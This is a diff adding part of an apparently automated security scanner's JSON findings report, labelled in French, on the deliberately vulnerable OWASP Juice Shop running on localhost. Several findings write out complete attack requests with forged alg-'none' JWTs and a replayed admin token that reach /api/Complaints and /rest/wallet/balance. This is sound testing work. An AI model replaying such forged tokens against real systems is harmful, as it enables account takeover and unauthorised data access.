+      ],
+      "diffs": [
+        "DIFF-c91dd4c7"
+      ],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000",
+        "2. Avec les credentials de l'attaquant",
+        "3. Observer : JWT alg_none: token manipule accepte (200) -- validation JWT defaillante"
+      ],
+      "mutation_type": "jwt_manipulation",
+      "winning_request": {
+        "method": "GET",
+        "url": "http://localhost:3000",
+        "headers": {
+          "host": "localhost:3000",
+          "accept": "*/*",
+          "accept-encoding": "gzip, deflate, br, zstd",
+          "connection": "keep-alive",
+          "user-agent": "python-httpx/0.28.1",
+          "authorization": "[REDACTED]",
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoyNywidXNlcm5hbWUiOiIiLCJlbWFpbCI6Imhkd3BfdXNlckB0ZXN0LmxvY2FsIiwicGFzc3dvcmQiOiI2NmFmOGEyMTM5MTU3NTc4YjdiMzgyYjRjMGFmM2UyNCIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDktMTEgMTY6Mzg6MzIuMTA3ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDktMTEgMTY6Mzg6MzIuMTA3ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImJpZCI6OCwiaWF0IjoxNzg5MTQ0NzEyfQ."
+        },
+        "body": null,
+        "query_params": {},
+        "path_params": {},
+        "raw_body_override": null
+      },
+      "winning_response_sample": "<!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta charset=\"utf-8\">\n  <title>OWASP Juice Shop</title>\n  <meta name=\"description\" content=\"Probably the most modern and sophisticated insecure web application\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n  <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n  <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n  <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isRFJXGdg.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isfFJU.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}</style>\n  <link id=\"favicon\" rel=\"icon\" type=\"image/x-icon\" href=\"assets/public/favicon_js.ico\">\n  <script>\n    window.addEventListener(\"load\", function(){\n      window.cookieconsent.initialise({\n        \"palette\": {\n          \"popup\": { \"background\": \"var(--theme-primary)\", \"text\": \"var(--theme-text)\" },\n          \"button\": { \"background\": \""
+    },
+    "remediation_hint": "Valider le token JWT avec un algorithme fixe et verifie la signature.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-693373d2",
+    "hypothesis_id": "HYP-d422769a",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.9336,
+    "confidence_breakdown": {
+      "oracle_strength": 0.9,
+      "reproducibility": 1.0,
+      "observation_quality": 0.7737,
+      "behavioral_specificity": 0.95,
+      "experiment_coverage": 1.0,
+      "overall": 0.9336,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": {
+      "v1_score": 0.9336,
+      "v2_score": 0.4792,
+      "ml_score": 0.0,
+      "signals": {
+        "oracle_strength": 0.9,
+        "reproducibility": 1.0,
+        "observation_quality": 0.7737,
+        "behavioral_specificity": 0.95,
+        "experiment_coverage": 1.0,
+        "temporal_signal": 0.0,
+        "crossrole_signal": 0.0,
+        "invariant_violated": 0.0,
+        "waf_bypass_success": 0.0,
+        "causal_depth": 0.3333333333333333
+      },
+      "top_contributors": [
+        {
+          "dimension": "reproducibility",
+          "raw_value": 1.0,
+          "weight": 1.6244,
+          "contribution": 1.6244,
+          "label": "Reproductibilité"
+        },
+        {
+          "dimension": "oracle_strength",
+          "raw_value": 0.9,
+          "weight": 1.3543,
+          "contribution": 1.2188,
+          "label": "Force du verdict oracle"
+        },
+        {
+          "dimension": "behavioral_specificity",
+          "raw_value": 0.95,
+          "weight": 0.9564,
+          "contribution": 0.9086,
+          "label": "Spécificité comportementale"
+        },
+        {
+          "dimension": "causal_depth",
+          "raw_value": 0.3333,
+          "weight": 1.0074,
+          "contribution": 0.3358,
+          "label": "Profondeur de causalité (replays)"
+        },
+        {
+          "dimension": "observation_quality",
+          "raw_value": 0.7737,
+          "weight": 0.356,
+          "contribution": 0.2754,
+          "label": "Qualité des observations"
+        }
+      ],
+      "verdict_rationale": "Principaux signaux : Reproductibilité (+1.62), Force du verdict oracle (+1.22), Spécificité comportementale (+0.91)"
+    },
+    "owasp_category": "A01:2021",
+    "cwe_id": "CWE-284",
+    "severity": "HIGH",
+    "affected_endpoints": [
+      "/api/Complaints"
+    ],
+    "proof": {
+      "experiments": [
+        "EXP-f173b1ed",
+        "EXP-cfd33ba5",
+        "EXP-9d8d52f3"
+      ],
+      "diffs": [
+        "DIFF-a54bfbbd"
+      ],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Complaints",
+        "2. Avec les credentials de l'attaquant",
+        "3. Observer : Privilege escalation succeeded: endpoint returned 200 for unauthorized role"
+      ],
+      "mutation_type": "privilege_escalation",
+      "winning_request": {
+        "method": "GET",
+        "url": "http://localhost:3000/api/Complaints",
+        "headers": {
+          "host": "localhost:3000",
+          "accept": "*/*",
+          "accept-encoding": "gzip, deflate, br, zstd",
+          "connection": "keep-alive",
+          "user-agent": "python-httpx/0.28.1",
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOS0xMSAxMTo0Njo1MS42MDMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOS0xMSAxMTo0Njo1MS42MDMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODkxNDQ3MDB9.KRFLIQZi8sTpIgP6Xik76J5R2ZJxnU2BIt-seZ19kmNz8GJ6UqjlpMJ3EPZk2wf2dnIHZ2N0dpvM9RIDjZywQOXd2nms5iV7HzzTSByuUdJx4gbfL8Mf0vYe_mS2RQ_BmkZ2jFEvff-G4qhA1zY06-hAmr5BFIfrNKae33jcyE8"
+        },
+        "body": null,
+        "query_params": {},
+        "path_params": {},
+        "raw_body_override": null
+      },
+      "winning_response_sample": "{'status': 'success', 'data': [{'UserId': 3, 'id': 1, 'message': \"I'll build my own eCommerce business! With Black Jack! And Hookers!\", 'file': None, 'createdAt': '2026-09-11T11:46:55.608Z', 'updatedAt': '2026-09-11T11:46:55.608Z'}, {'UserId': None, 'id': 2, 'message': None, 'file': None, 'createdAt': '2026-09-11T16:40:13.637Z', 'updatedAt': '2026-09-11T16:40:13.637Z'}]}"
+    },
+    "remediation_hint": "Implementer un controle de role explicite sur cet endpoint.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-494b499c",
+    "hypothesis_id": "HYP-285a6f7f",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.9461,
+    "confidence_breakdown": {
+      "oracle_strength": 0.95,
+      "reproducibility": 1.0,
+      "observation_quality": 0.7737,
+      "behavioral_specificity": 0.95,
+      "experiment_coverage": 1.0,
+      "overall": 0.9461,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": {
+      "v1_score": 0.9461,
+      "v2_score": 0.5316,
+      "ml_score": 0.0,
+      "signals": {
+        "oracle_strength": 0.95,
+        "reproducibility": 1.0,
+        "observation_quality": 0.7737,
+        "behavioral_specificity": 0.95,
+        "experiment_coverage": 1.0,
+        "temporal_signal": 0.0,
+        "crossrole_signal": 0.0,
+        "invariant_violated": 0.0,
+        "waf_bypass_success": 0.0,
+        "causal_depth": 0.3333333333333333
+      },
+      "top_contributors": [
+        {
+          "dimension": "reproducibility",
+          "raw_value": 1.0,
+          "weight": 1.6504,
+          "contribution": 1.6504,
+          "label": "Reproductibilité"
+        },
+        {
+          "dimension": "oracle_strength",
+          "raw_value": 0.95,
+          "weight": 1.3776,
+          "contribution": 1.3088,
+          "label": "Force du verdict oracle"
+        },
+        {
+          "dimension": "behavioral_specificity",
+          "raw_value": 0.95,
+          "weight": 0.9811,
+          "contribution": 0.932,
+          "label": "Spécificité comportementale"
+        },
+        {
+          "dimension": "causal_depth",
+          "raw_value": 0.3333,
+          "weight": 1.0161,
+          "contribution": 0.3387,
+          "label": "Profondeur de causalité (replays)"
+        },
+        {
+          "dimension": "observation_quality",
+          "raw_value": 0.7737,
+          "weight": 0.3761,
+          "contribution": 0.291,
+          "label": "Qualité des observations"
+        }
+      ],
+      "verdict_rationale": "Principaux signaux : Reproductibilité (+1.65), Force du verdict oracle (+1.31), Spécificité comportementale (+0.93)"
+    },
+    "owasp_category": "A02:2021",
+    "cwe_id": "CWE-347",
+    "severity": "HIGH",
+    "affected_endpoints": [
+      ""
+    ],
+    "proof": {
+      "experiments": [
+        "EXP-b67b81d5",
+        "EXP-fda9ecce",
+        "EXP-2794f1d4"
+      ],
+      "diffs": [
+        "DIFF-130e670e"
+      ],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000",
+        "2. Avec les credentials de l'attaquant",
+        "3. Observer : JWT alg_none: token manipule accepte (200) -- validation JWT defaillante"
+      ],
+      "mutation_type": "jwt_manipulation",
+      "winning_request": {
+        "method": "GET",
+        "url": "http://localhost:3000",
+        "headers": {
+          "host": "localhost:3000",
+          "accept": "*/*",
+          "accept-encoding": "gzip, deflate, br, zstd",
+          "connection": "keep-alive",
+          "user-agent": "python-httpx/0.28.1",
+          "authorization": "[REDACTED]",
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoyNywidXNlcm5hbWUiOiIiLCJlbWFpbCI6Imhkd3BfdXNlckB0ZXN0LmxvY2FsIiwicGFzc3dvcmQiOiI2NmFmOGEyMTM5MTU3NTc4YjdiMzgyYjRjMGFmM2UyNCIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDktMTEgMTY6Mzg6MzIuMTA3ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDktMTEgMTY6Mzg6MzIuMTA3ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImJpZCI6OCwiaWF0IjoxNzg5MTQ0NzEyfQ."
+        },
+        "body": null,
+        "query_params": {},
+        "path_params": {},
+        "raw_body_override": null
+      },
+      "winning_response_sample": "<!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta charset=\"utf-8\">\n  <title>OWASP Juice Shop</title>\n  <meta name=\"description\" content=\"Probably the most modern and sophisticated insecure web application\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n  <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n  <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n  <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isRFJXGdg.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isfFJU.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}</style>\n  <link id=\"favicon\" rel=\"icon\" type=\"image/x-icon\" href=\"assets/public/favicon_js.ico\">\n  <script>\n    window.addEventListener(\"load\", function(){\n      window.cookieconsent.initialise({\n        \"palette\": {\n          \"popup\": { \"background\": \"var(--theme-primary)\", \"text\": \"var(--theme-text)\" },\n          \"button\": { \"background\": \""
+    },
+    "remediation_hint": "Valider le token JWT avec un algorithme fixe et verifie la signature.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-52e1a87f",
+    "hypothesis_id": "HYP-2a9184c3",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.9336,
+    "confidence_breakdown": {
+      "oracle_strength": 0.9,
+      "reproducibility": 1.0,
+      "observation_quality": 0.7737,
+      "behavioral_specificity": 0.95,
+      "experiment_coverage": 1.0,
+      "overall": 0.9336,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": {
+      "v1_score": 0.9336,
+      "v2_score": 0.5463,
+      "ml_score": 0.0,
+      "signals": {
+        "oracle_strength": 0.9,
+        "reproducibility": 1.0,
+        "observation_quality": 0.7737,
+        "behavioral_specificity": 0.95,
+        "experiment_coverage": 1.0,
+        "temporal_signal": 0.0,
+        "crossrole_signal": 0.0,
+        "invariant_violated": 0.0,
+        "waf_bypass_success": 0.0,
+        "causal_depth": 0.3333333333333333
+      },
+      "top_contributors": [
+        {
+          "dimension": "reproducibility",
+          "raw_value": 1.0,
+          "weight": 1.6737,
+          "contribution": 1.6737,
+          "label": "Reproductibilité"
+        },
+        {
+          "dimension": "oracle_strength",
+          "raw_value": 0.9,
+          "weight": 1.3998,
+          "contribution": 1.2598,
+          "label": "Force du verdict oracle"
+        },
+        {
+          "dimension": "behavioral_specificity",
+          "raw_value": 0.95,
+          "weight": 1.0033,
+          "contribution": 0.9531,
+          "label": "Spécificité comportementale"
+        },
+        {
+          "dimension": "causal_depth",
+          "raw_value": 0.3333,
+          "weight": 1.0238,
+          "contribution": 0.3413,
+          "label": "Profondeur de causalité (replays)"
+        },
+        {
+          "dimension": "observation_quality",
+          "raw_value": 0.7737,
+          "weight": 0.3942,
+          "contribution": 0.305,
+          "label": "Qualité des observations"
+        }
+      ],
+      "verdict_rationale": "Principaux signaux : Reproductibilité (+1.67), Force du verdict oracle (+1.26), Spécificité comportementale (+0.95)"
+    },
+    "owasp_category": "A01:2021",
+    "cwe_id": "CWE-284",
+    "severity": "HIGH",
+    "affected_endpoints": [
+      "/rest/wallet/balance"
+    ],
+    "proof": {
+      "experiments": [
+        "EXP-907282a9",
+        "EXP-488a3915",
+        "EXP-72f315fd"
+      ],
+      "diffs": [
+        "DIFF-a72a629c"
+      ],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/wallet/balance",
+        "2. Avec les credentials de l'attaquant",
+        "3. Observer : Privilege escalation succeeded: endpoint returned 200 for unauthorized role"
+      ],
+      "mutation_type": "privilege_escalation",
+      "winning_request": {
+        "method": "GET",
+        "url": "http://localhost:3000/rest/wallet/balance",
+        "headers": {
+          "host": "localhost:3000",
+          "accept": "*/*",
+          "accept-encoding": "gzip, deflate, br, zstd",
+          "connection": "keep-alive",
+          "user-agent": "python-httpx/0.28.1",
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOS0xMSAxMTo0Njo1MS42MDMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOS0xMSAxMTo0Njo1MS42MDMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODkxNDQ3MDB9.KRFLIQZi8sTpIgP6Xik76J5R2ZJxnU2BIt-seZ19kmNz8GJ6UqjlpMJ3EPZk2wf2dnIHZ2N0dpvM9RIDjZywQOXd2nms5iV7HzzTSByuUdJx4gbfL8Mf0vYe_mS2RQ_BmkZ2jFEvff-G4qhA1zY06-hAmr5BFIfrNKae33jcyE8"
+        },
+        "body": null,
+        "query_params": {},
+        "path_params": {},
+        "raw_body_override": null
+      },
+      "winning_response_sample": "{'status': 'success', 'data': 0}"
+    },
+    "remediation_hint": "Implementer un controle de role explicite sur cet endpoint.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-87887017",
+    "hypothesis_id": "HYP-c80e3955",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.9461,
+    "confidence_breakdown": {
+      "oracle_strength": 0.95,
+      "reproducibility": 1.0,
+      "observation_quality": 0.7737,
+      "behavioral_specificity": 0.95,
+      "experiment_coverage": 1.0,
+      "overall": 0.9461,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": {
+      "v1_score": 0.9461,
+      "v2_score": 0.5457,
+      "ml_score": 0.0,
+      "signals": {
+        "oracle_strength": 0.95,
+        "reproducibility": 1.0,
+        "observation_quality": 0.7737,
+        "behavioral_specificity": 0.95,
+        "experiment_coverage": 1.0,
+        "temporal_signal": 0.0,
+        "crossrole_signal": 0.0,
+        "invariant_violated": 0.0,
+        "waf_bypass_success": 0.0,
+        "causal_depth": 0.3333333333333333
+      },
+      "top_contributors": [
+        {
+          "dimension": "reproducibility",
+          "raw_value": 1.0,
+          "weight": 1.6524,
+          "contribution": 1.6524,
+          "label": "Reproductibilité"
+        },
+        {
+          "dimension": "oracle_strength",
+          "raw_value": 0.95,
+          "weight": 1.3894,
+          "contribution": 1.3199,
+          "label": "Force du verdict oracle"
+        },
+        {
+          "dimension": "behavioral_specificity",
+          "raw_value": 0.95,
+          "weight": 1.0203,
+          "contribution": 0.9693,
+          "label": "Spécificité comportementale"
+        },
+        {
+          "dimension": "causal_depth",
+          "raw_value": 0.3333,
+          "weight": 1.0166,
+          "contribution": 0.3389,
+          "label": "Profondeur de causalité (replays)"
+        },
+        {
+          "dimension": "observation_quality",
+          "raw_value": 0.7737,
+          "weight": 0.3779,
+          "contribution": 0.2924,
+          "label": "Qualité des observations"
+        }
+      ],
+      "verdict_rationale": "Principaux signaux : Reproductibilité (+1.65), Force du verdict oracle (+1.32), Spécificité comportementale (+0.97)"
+    },
+    "owasp_category": "A02:2021",
+    "cwe_id": "CWE-347",
+    "severity": "HIGH",
+    "affected_endpoints": [
+      ""
+    ],
+    "proof": {
+      "experiments": [
+        "EXP-8df82140",
+        "EXP-2bbd4a19",
+        "EXP-723506f7"
+      ],
+      "diffs": [
+        "DIFF-3d25e471"
+      ],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000",
+        "2. Avec les credentials de l'attaquant",
+        "3. Observer : JWT alg_none: token manipule accepte (200) -- validation JWT defaillante"
+      ],
+      "mutation_type": "jwt_manipulation",
+      "winning_request": {
+        "method": "GET",
+        "url": "http://localhost:3000",
+        "headers": {
+          "host": "localhost:3000",
+          "accept": "*/*",
+          "accept-encoding": "gzip, deflate, br, zstd",
+          "connection": "keep-alive",
+          "user-agent": "python-httpx/0.28.1",
+          "authorization": "[REDACTED]",
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoyNywidXNlcm5hbWUiOiIiLCJlbWFpbCI6Imhkd3BfdXNlckB0ZXN0LmxvY2FsIiwicGFzc3dvcmQiOiI2NmFmOGEyMTM5MTU3NTc4YjdiMzgyYjRjMGFmM2UyNCIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDktMTEgMTY6Mzg6MzIuMTA3ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDktMTEgMTY6Mzg6MzIuMTA3ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImJpZCI6OCwiaWF0IjoxNzg5MTQ0NzEyfQ."
+        },
+        "body": null,
+        "query_params": {},
+        "path_params": {},
+        "raw_body_override": null
+      },
+      "winning_response_sample": "<!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta charset=\"utf-8\">\n  <title>OWASP Juice Shop</title>\n  <meta name=\"description\" content=\"Probably the most modern and sophisticated insecure web application\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n  <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n  <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n  <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isRFJXGdg.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isfFJU.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}</style>\n  <link id=\"favicon\" rel=\"icon\" type=\"image/x-icon\" href=\"assets/public/favicon_js.ico\">\n  <script>\n    window.addEventListener(\"load\", function(){\n      window.cookieconsent.initialise({\n        \"palette\": {\n          \"popup\": { \"background\": \"var(--theme-primary)\", \"text\": \"var(--theme-text)\" },\n          \"button\": { \"background\": \""
+    },
+    "remediation_hint": "Valider le token JWT avec un algorithme fixe et verifie la signature.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-ef6ecb83",
+    "hypothesis_id": "HYP-fca2d92a",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.9461,
+    "confidence_breakdown": {
+      "oracle_strength": 0.95,
+      "reproducibility": 1.0,
+      "observation_quality": 0.7737,
+      "behavioral_specificity": 0.95,
+      "experiment_coverage": 1.0,
+      "overall": 0.9461,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": {
+      "v1_score": 0.9461,
+      "v2_score": 0.5446,
+      "ml_score": 0.0,
+      "signals": {
+        "oracle_strength": 0.95,
+        "reproducibility": 1.0,
+        "observation_quality": 0.7737,
+        "behavioral_specificity": 0.95,
+        "experiment_coverage": 1.0,
+        "temporal_signal": 0.0,
+        "crossrole_signal": 0.0,
+        "invariant_violated": 0.0,
+        "waf_bypass_success": 0.0,
+        "causal_depth": 0.3333333333333333
+      },
+      "top_contributors": [
+        {
+          "dimension": "reproducibility",
+          "raw_value": 1.0,
+          "weight": 1.646,
+          "contribution": 1.646,
+          "label": "Reproductibilité"
+        },
+        {
+          "dimension": "oracle_strength",
+          "raw_value": 0.95,
+          "weight": 1.3906,
+          "contribution": 1.3211,
+          "label": "Force du verdict oracle"
+        },
+        {
+          "dimension": "behavioral_specificity",
+          "raw_value": 0.95,
+          "weight": 1.0389,
+          "contribution": 0.987,
+          "label": "Spécificité comportementale"
+        },
+        {
+          "dimension": "causal_depth",
+          "raw_value": 0.3333,
+          "weight": 1.0145,
+          "contribution": 0.3382,
+          "label": "Profondeur de causalité (replays)"
+        },
+        {
+          "dimension": "observation_quality",
+          "raw_value": 0.7737,
+          "weight": 0.3731,
+          "contribution": 0.2886,
+          "label": "Qualité des observations"
+        }
+      ],
+      "verdict_rationale": "Principaux signaux : Reproductibilité (+1.65), Force du verdict oracle (+1.32), Spécificité comportementale (+0.99)"
+    },
+    "owasp_category": "A02:2021",
+    "cwe_id": "CWE-347",
+    "severity": "HIGH",
+    "affected_endpoints": [
+      ""
+    ],
+    "proof": {
+      "experiments": [
+        "EXP-aa557912",
+        "EXP-75b7f569",
+        "EXP-f2c6dc5d"
+      ],
+      "diffs": [
+        "DIFF-6bba8066"
+      ],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000",
+        "2. Avec les credentials de l'attaquant",
+        "3. Observer : JWT alg_none: token manipule accepte (200) -- validation JWT defaillante"
+      ],
+      "mutation_type": "jwt_manipulation",
+      "winning_request": {
+        "method": "GET",
+        "url": "http://localhost:3000",
+        "headers": {
+          "host": "localhost:3000",
+          "accept": "*/*",
+          "accept-encoding": "gzip, deflate, br, zstd",
+          "connection": "keep-alive",
+          "user-agent": "python-httpx/0.28.1",
+          "authorization": "[REDACTED]",
